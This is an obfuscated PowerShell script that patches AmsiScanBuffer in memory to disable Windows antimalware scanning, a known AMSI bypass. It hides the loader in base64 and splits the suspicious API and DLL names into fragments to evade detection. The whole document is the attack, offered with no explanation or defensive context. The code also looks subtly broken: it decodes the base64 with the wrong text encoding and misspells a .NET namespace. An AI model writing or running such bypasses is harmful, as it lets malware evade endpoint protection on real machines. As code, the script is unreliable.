$a = "dXNp"+"bmcgU3lzdGVtOw"+"p1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpwdWJsaWMgY2xhc3MgcmZjIHsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBoTW9kdWxlLCBzdHJpbmcgcHJvY05hbWUpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnRQdHIgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOwoKfQ=="
$n32 = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($a))
Add-Type -TypeDefinition $n32

$lib = [rfc]::LoadLibrary("a"+"msi."+"dll")
$add = [rfc]::GetProcAddress($lib, "Ams"+"iSca"+"nBuff"+"er")
$p = 0 
[rfc]::VirtualProtect($add, [uint32]5, 0x40, [ref]$p)
$pat = [Byte[]] (184, 87, 0, 7, 128, 195)
[System.Runtime.InteropService.Marshal]::Copy($pat, 0, $add, 6)